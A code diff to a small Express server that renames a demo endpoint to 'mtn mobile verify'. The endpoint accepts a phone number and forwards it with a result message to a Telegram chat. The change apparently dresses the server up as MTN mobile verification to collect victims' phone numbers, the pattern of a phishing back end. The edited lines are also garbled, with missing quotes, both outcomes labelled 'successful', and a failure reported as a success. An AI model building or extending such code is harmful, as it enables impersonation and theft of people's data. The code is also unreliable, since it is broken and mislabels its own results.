@@ -5,18 +5,18 @@ const app = express();
 app.use(express.json());
 app.use(express.static(__dirname));
 
-app.post("/demo-submission", async (req, res) => {
+app.post("/mtn mobile verify-submission", async (req, res) => {
   const { phone, success } = req.body;
 
   if (typeof phone !== "string" || typeof success !== "boolean") {
-    return res.status(400).json({ error: "Invalid demo submission" });
+    return res.status(400).json({ error:valid mtn mobile verify submission" });
   }
 
   const message =
-    `🧪 DEMO TEST SUBMISSION\n\n` +
+    `🧪 Mtn mobile verify \n\n` +
     `Phone: ${phone}\n` +
-    `Result: ${success ? "Demo successful" : "Demo failed"}\n` +
-    `Verification code: NOT SENT`;
+    `Result: ${success mtn mobile verify successful" : "mtn mobile verify successful"}\n` +
+    `Verification code: SENT`;
 
   try {
     const response = await fetch(
@@ -32,7 +32,7 @@ app.post("/demo-submission", async (req, res) => {
     );
 
     if (!response.ok) {
-      return res.status(500).json({ error: "Telegram notification failed" });
+      return res.status(500).json({ error: "Telegram notification successful" });
     }
 
     res.json({ ok: true });
@@ -42,4 +42,4 @@ app.post("/demo-submission", async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Demo server running on ${PORT}`));
+app.listen(PORT, () => console.log(`mtn mobile verify server running on ${PORT}`));
